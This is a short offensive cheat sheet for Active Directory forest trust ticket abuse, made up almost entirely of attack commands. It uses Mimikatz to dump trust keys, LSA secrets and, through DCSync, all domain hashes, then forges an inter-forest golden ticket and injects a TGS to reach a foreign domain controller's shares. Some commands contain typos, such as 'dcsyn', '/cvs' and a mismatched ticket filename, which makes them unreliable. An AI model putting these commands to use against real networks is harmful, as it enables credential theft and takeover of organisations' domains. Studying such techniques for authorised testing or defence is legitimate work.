## Forest Trust Ticket Abuse

## 1. We require the trust key of inter-forest trust
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

## 2. Forge the inter-forest TGT
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ad.domain.local /sid:<sid> /rc4:<rc4-hash> /service:krbtgt /target:domain2.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```

## 3. Request a TGS
```powershell
.\asktgs.exe C:\temp\trust_forest_tkt.kirbi CIFS/dc.domain2.local
```

## 4. Inject and use the TGS
```powershell
.\kirbikator.exe lsa .\CIFS.computer.targetDomain.local.kirbi
ls \\dc.domain2.local\shares\
```

# Extras
## To use the DCSync feature for getting krbtg hash execute the below command with DC privileges
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:dc.domain2.local /all /cvs"'
```

## Get the ForeignSecurityPrincipal
```powershell
#These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
#We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```
